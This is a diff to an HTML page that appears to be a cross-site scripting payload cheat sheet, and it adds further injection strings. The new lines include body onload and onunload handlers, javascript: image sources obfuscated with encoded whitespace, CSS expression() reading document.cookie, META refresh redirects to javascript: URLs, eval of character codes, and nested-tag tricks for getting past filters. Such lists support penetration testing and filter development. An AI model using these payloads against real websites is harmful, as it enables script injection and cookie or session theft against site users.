@@ -14,8 +14,12 @@ svg onload=“alert(1)”<br/>
 \’-alert(1)//<br/>
 ’-alert(1)-‘<br/>
 &lt;/script&gt;&lt;svg onload=alert(1)&gt;<br/>
+&lt;body onLoad="alert('XSS');"<br/>
+&lt;body onunload="javascript:alert('XSS');"&gt;<br/>
 ” onmouseover=alert(1)//<br/>
 &lt;script&gt;alert(1)&lt;/script&gt;<br/>
+<span style="font-size: 10pt"><span style="font-family: sans">&lt;script&gt;alert('CSS Vulnerable')&lt;/script&gt;<br/>
+</span></span><span style="font-size: 10pt"><span style="font-family: sans">&lt;script language="JavaScript"&gt;alert('XSS')&lt;/script&gt;</span></span><br/>
 &lt;script src=javascript:alert(1)&gt;<br/>
 &lt;iframe src=javascript:alert(1)&gt;<br/>
 &lt;embed src=javascript:alert(1)&gt;<br/>
@@ -38,8 +42,23 @@ svg onload=“alert(1)”<br/>
 &lt;IMG SRC=javascript:alert('XSS')&gt;<br/>
 &lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;<br/>
 &lt;IMG SRC=javascript:alert("XSS")&gt;<br/>
+&lt;IMG SRC=\"jav&amp;#x0D;ascript:alert('XSS');\"&gt;<br/>
+&lt;IMG SRC=\"jav&amp;#x0A;ascript:alert('XSS');\"&gt;<br/>
+&lt;IMG SRC=\"jav&amp;#x09;ascript:alert('XSS');\"&gt;<br/>
+&lt;IMG DYNSRC=\"javascript:alert('XSS')\"&gt;<br/>
+&lt;IMG LOWSRC=\"javascript:alert('XSS')\"&gt;<br/>
 &lt;IMG onmouseover="alert('xxs')"&gt;<br/>
 &lt;a onmouseover="alert(2)"&gt;d&lt;/a&gt;<br/>
-<br/>
-<br/>
-</body></html>
+javascript:alert('executing script')<br/>
+&lt;font style='color:expression(alert(document.cookie))'&gt;<span style="font-family: sans"><span style="font-size: 10pt"><br/>
+</span></span><span style="font-family: sans"><span style="font-size: 10pt">&amp;{alert('CSS Vulnerable')};</span></span><br/>
+&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;URL=http://;URL=javascript:alert('XSS');\"&gt;<br/>
+&lt;META HTTP-EQUIV=\"refresh\"CONTENT=\"0;url=javascript:alert('XSS');\"&gt;<br/>
+&lt;img src=1.gif onerror=alert(1)&gt;<br/>
+&lt;div style="x:expression((window.r==1)?'':eval('r=1;alert(String.fromCharCode(88,83,83));'))"&gt;<br/>
+&lt;iframe&lt;?php echo chr(11)?&gt; onload=alert('XSS')&gt;&lt;/iframe&gt;<br/>
+&lt;? echo('&lt;scr)';echo('ipt&gt;alert(\"XSS\")&lt;/script&gt;'); ?&gt;<br/>
+&lt;style&gt;@im\port'\ja\vasc\ript:alert(\"XSS\")';&lt;/style&gt;<br/>
+&lt;scr&lt;script&gt;ipt&gt;alert('XSS');&lt;/scr&lt;/script&gt;ipt&gt;<br/>
+&lt;a&amp;xss=&lt;x:vmlframe src=payload&gt;<br/>
+'&amp;js_xss=";alert(0)//</body></html>
